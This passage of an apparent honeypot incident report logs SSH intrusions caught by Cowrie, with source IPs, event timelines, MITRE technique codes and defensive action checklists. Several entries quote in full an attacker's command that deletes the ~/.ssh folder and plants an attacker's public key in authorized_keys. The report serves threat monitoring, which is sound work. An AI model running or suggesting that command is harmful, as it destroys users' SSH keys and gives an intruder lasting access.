| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 04:13:50` | `cowrie.session.connect` |
| `2026-05-23 04:13:50` | `cowrie.client.version` |
| `2026-05-23 04:13:51` | `cowrie.client.kex` |
| `2026-05-23 04:13:51` | `cowrie.login.success` |
| `2026-05-23 04:13:51` | `cowrie.session.params` |
| `2026-05-23 04:13:51` | `cowrie.command.input` |
| `2026-05-23 04:13:51` | `cowrie.command.failed` |
| `2026-05-23 04:13:51` | `cowrie.log.closed` |
| `2026-05-23 04:13:51` | `cowrie.session.params` |
| `2026-05-23 04:13:51` | `cowrie.command.input` |
| `2026-05-23 04:13:51` | `cowrie.session.file_download` |
| `2026-05-23 04:13:51` | `cowrie.log.closed` |
| `2026-05-23 04:13:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.40[.]65` to AbuseIPDB if not already reported
- [ ] Block `103.158.40[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51fa0c3e3074

| Field | Detail |
|---|---|
| **Source IP** | `103.158.40[.]65` |
| **First Seen** | 2026-05-23 04:13 |
| **Last Seen** | 2026-05-23 04:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 04:13:54` | `cowrie.session.connect` |
| `2026-05-23 04:13:54` | `cowrie.client.version` |
| `2026-05-23 04:13:54` | `cowrie.client.kex` |
| `2026-05-23 04:13:56` | `cowrie.login.success` |
| `2026-05-23 04:13:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.40[.]65` to AbuseIPDB if not already reported
- [ ] Block `103.158.40[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd09842968c3

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-23 04:15 |
| **Last Seen** | 2026-05-23 04:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 04:15:37` | `cowrie.session.connect` |
| `2026-05-23 04:15:37` | `cowrie.client.version` |
| `2026-05-23 04:15:37` | `cowrie.client.kex` |
| `2026-05-23 04:15:38` | `cowrie.login.success` |
| `2026-05-23 04:15:39` | `cowrie.session.params` |
| `2026-05-23 04:15:39` | `cowrie.command.input` |
| `2026-05-23 04:15:39` | `cowrie.command.failed` |
| `2026-05-23 04:15:39` | `cowrie.log.closed` |
| `2026-05-23 04:15:40` | `cowrie.session.params` |
| `2026-05-23 04:15:40` | `cowrie.command.input` |
| `2026-05-23 04:15:40` | `cowrie.session.file_download` |
| `2026-05-23 04:15:40` | `cowrie.log.closed` |
| `2026-05-23 04:15:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c5d08523f10

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-23 04:15 |
| **Last Seen** | 2026-05-23 04:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 04:15:44` | `cowrie.session.connect` |
| `2026-05-23 04:15:44` | `cowrie.client.version` |
| `2026-05-23 04:15:44` | `cowrie.client.kex` |
| `2026-05-23 04:15:45` | `cowrie.login.success` |
| `2026-05-23 04:15:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd2842eb6276

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-23 04:21 |
| **Last Seen** | 2026-05-23 04:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 04:21:12` | `cowrie.session.connect` |
| `2026-05-23 04:21:12` | `cowrie.client.version` |
| `2026-05-23 04:21:13` | `cowrie.client.kex` |
| `2026-05-23 04:21:14` | `cowrie.login.success` |
| `2026-05-23 04:21:15` | `cowrie.session.params` |
| `2026-05-23 04:21:15` | `cowrie.command.input` |
| `2026-05-23 04:21:15` | `cowrie.command.failed` |
| `2026-05-23 04:21:15` | `cowrie.log.closed` |
| `2026-05-23 04:21:16` | `cowrie.session.params` |
| `2026-05-23 04:21:16` | `cowrie.command.input` |
| `2026-05-23 04:21:16` | `cowrie.session.file_download` |
| `2026-05-23 04:21:16` | `cowrie.log.closed` |
| `2026-05-23 04:21:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1bfc974f985

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-23 04:21 |
| **Last Seen** | 2026-05-23 04:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 04:21:19` | `cowrie.session.connect` |
| `2026-05-23 04:21:19` | `cowrie.client.version` |
| `2026-05-23 04:21:20` | `cowrie.client.kex` |
| `2026-05-23 04:21:21` | `cowrie.login.success` |
| `2026-05-23 04:21:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42cbc087634e

| Field | Detail |
|---|---|
| **Source IP** | `103.158.40[.]65` |
| **First Seen** | 2026-05-23 04:23 |
| **Last Seen** | 2026-05-23 04:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 04:23:08` | `cowrie.session.connect` |
| `2026-05-23 04:23:08` | `cowrie.client.version` |
| `2026-05-23 04:23:08` | `cowrie.client.kex` |
| `2026-05-23 04:23:08` | `cowrie.login.success` |
| `2026-05-23 04:23:08` | `cowrie.session.params` |
| `2026-05-23 04:23:08` | `cowrie.command.input` |
| `2026-05-23 04:23:08` | `cowrie.command.failed` |
| `2026-05-23 04:23:08` | `cowrie.log.closed` |
| `2026-05-23 04:23:08` | `cowrie.session.params` |
| `2026-05-23 04:23:08` | `cowrie.command.input` |
| `2026-05-23 04:23:08` | `cowrie.session.file_download` |
| `2026-05-23 04:23:08` | `cowrie.log.closed` |
| `2026-05-23 04:23:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.40[.]65` to AbuseIPDB if not already reported
- [ ] Block `103.158.40[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e8b5556a5ef

| Field | Detail |
|---|---|
| **Source IP** | `103.158.40[.]65` |
| **First Seen** | 2026-05-23 04:23 |
| **Last Seen** | 2026-05-23 04:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 04:23:09` | `cowrie.session.connect` |
| `2026-05-23 04:23:09` | `cowrie.client.version` |
| `2026-05-23 04:23:09` | `cowrie.client.kex` |
| `2026-05-23 04:23:10` | `cowrie.login.success` |
| `2026-05-23 04:23:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.40[.]65` to AbuseIPDB if not already reported
- [ ] Block `103.158.40[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7450d16fe3e

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-23 04:26 |
| **Last Seen** | 2026-05-23 04:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 04:26:40` | `cowrie.session.connect` |
| `2026-05-23 04:26:40` | `cowrie.client.version` |
| `2026-05-23 04:26:41` | `cowrie.client.kex` |
| `2026-05-23 04:26:42` | `cowrie.login.success` |
| `2026-05-23 04:26:42` | `cowrie.session.params` |
| `2026-05-23 04:26:42` | `cowrie.command.input` |
| `2026-05-23 04:26:42` | `cowrie.command.failed` |
| `2026-05-23 04:26:43` | `cowrie.log.closed` |
| `2026-05-23 04:26:43` | `cowrie.session.params` |
| `2026-05-23 04:26:43` | `cowrie.command.input` |
| `2026-05-23 04:26:44` | `cowrie.session.file_download` |
| `2026-05-23 04:26:44` | `cowrie.log.closed` |
| `2026-05-23 04:26:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acfedb53f3f9

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-23 04:26 |
| **Last Seen** | 2026-05-23 04:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 04:26:47` | `cowrie.session.connect` |
| `2026-05-23 04:26:47` | `cowrie.client.version` |
| `2026-05-23 04:26:47` | `cowrie.client.kex` |
| `2026-05-23 04:26:49` | `cowrie.login.success` |
| `2026-05-23 04:26:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cb16c6ad003

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-23 04:54 |
| **Last Seen** | 2026-05-23 04:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 04:54:39` | `cowrie.session.connect` |
| `2026-05-23 04:54:39` | `cowrie.client.version` |
| `2026-05-23 04:54:39` | `cowrie.client.kex` |
| `2026-05-23 04:54:40` | `cowrie.login.success` |
| `2026-05-23 04:54:41` | `cowrie.session.params` |
| `2026-05-23 04:54:41` | `cowrie.command.input` |
| `2026-05-23 04:54:41` | `cowrie.command.failed` |
| `2026-05-23 04:54:41` | `cowrie.log.closed` |
| `2026-05-23 04:54:42` | `cowrie.session.params` |
| `2026-05-23 04:54:42` | `cowrie.command.input` |
| `2026-05-23 04:54:42` | `cowrie.session.file_download` |
| `2026-05-23 04:54:42` | `cowrie.log.closed` |
| `2026-05-23 04:54:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f599d0e88f7

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-23 04:54 |
| **Last Seen** | 2026-05-23 04:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 04:54:45` | `cowrie.session.connect` |
| `2026-05-23 04:54:45` | `cowrie.client.version` |
| `2026-05-23 04:54:46` | `cowrie.client.kex` |
| `2026-05-23 04:54:47` | `cowrie.login.success` |
| `2026-05-23 04:54:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38cabf2f495c

| Field | Detail |
|---|---|
| **Source IP** | `113.44.104[.]43` |
| **First Seen** | 2026-05-23 05:12 |
| **Last Seen** | 2026-05-23 05:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 05:12:23` | `cowrie.session.connect` |
| `2026-05-23 05:12:23` | `cowrie.client.version` |
| `2026-05-23 05:12:23` | `cowrie.client.kex` |
| `2026-05-23 05:12:24` | `cowrie.login.success` |
| `2026-05-23 05:12:24` | `cowrie.session.params` |
| `2026-05-23 05:12:24` | `cowrie.command.input` |
| `2026-05-23 05:12:24` | `cowrie.command.failed` |
| `2026-05-23 05:12:24` | `cowrie.log.closed` |
| `2026-05-23 05:12:24` | `cowrie.session.params` |
| `2026-05-23 05:12:24` | `cowrie.command.input` |
| `2026-05-23 05:12:25` | `cowrie.session.file_download` |
| `2026-05-23 05:12:25` | `cowrie.log.closed` |
| `2026-05-23 05:12:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.44.104[.]43` to AbuseIPDB if not already reported
- [ ] Block `113.44.104[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d32fc4184414

| Field | Detail |
|---|---|
| **Source IP** | `113.44.104[.]43` |
| **First Seen** | 2026-05-23 05:12 |
| **Last Seen** | 2026-05-23 05:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 05:12:27` | `cowrie.session.connect` |
| `2026-05-23 05:12:27` | `cowrie.client.version` |
| `2026-05-23 05:12:27` | `cowrie.client.kex` |
| `2026-05-23 05:12:28` | `cowrie.login.success` |
| `2026-05-23 05:12:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.44.104[.]43` to AbuseIPDB if not already reported
- [ ] Block `113.44.104[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76c964afe768

| Field | Detail |
|---|---|
| **Source IP** | `176.65.148[.]44` |
| **First Seen** | 2026-05-23 05:12 |
| **Last Seen** | 2026-05-23 05:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 05:12:38` | `cowrie.session.connect` |
| `2026-05-23 05:12:38` | `cowrie.client.version` |
| `2026-05-23 05:12:38` | `cowrie.client.kex` |
| `2026-05-23 05:12:39` | `cowrie.login.success` |
| `2026-05-23 05:12:39` | `cowrie.direct-tcpip.request` |
| `2026-05-23 05:12:39` | `cowrie.direct-tcpip.ja4` |
| `2026-05-23 05:12:39` | `cowrie.direct-tcpip.data` |
| `2026-05-23 05:12:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.148[.]44` to AbuseIPDB if not already reported
- [ ] Block `176.65.148[.]44` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd1b6c4a59b1

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-05-23 05:56 |
| **Last Seen** | 2026-05-23 05:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 05:56:01` | `cowrie.session.connect` |
| `2026-05-23 05:56:01` | `cowrie.client.version` |
| `2026-05-23 05:56:01` | `cowrie.client.kex` |
| `2026-05-23 05:56:02` | `cowrie.login.success` |
| `2026-05-23 05:56:02` | `cowrie.session.params` |
| `2026-05-23 05:56:02` | `cowrie.command.input` |
| `2026-05-23 05:56:02` | `cowrie.command.failed` |
| `2026-05-23 05:56:03` | `cowrie.log.closed` |
| `2026-05-23 05:56:03` | `cowrie.session.params` |
| `2026-05-23 05:56:03` | `cowrie.command.input` |
| `2026-05-23 05:56:03` | `cowrie.session.file_download` |
| `2026-05-23 05:56:03` | `cowrie.log.closed` |
| `2026-05-23 05:56:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f34d2bddef1a

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-05-23 05:56 |
| **Last Seen** | 2026-05-23 05:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 05:56:06` | `cowrie.session.connect` |
| `2026-05-23 05:56:06` | `cowrie.client.version` |
| `2026-05-23 05:56:06` | `cowrie.client.kex` |
| `2026-05-23 05:56:06` | `cowrie.login.success` |
| `2026-05-23 05:56:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `102.88.137[.]80` | **15** | 2026-05-23 03:56 | 2026-05-23 04:26 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `113.44.104[.]43` | **15** | 2026-05-23 04:49 | 2026-05-23 05:28 | 24m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
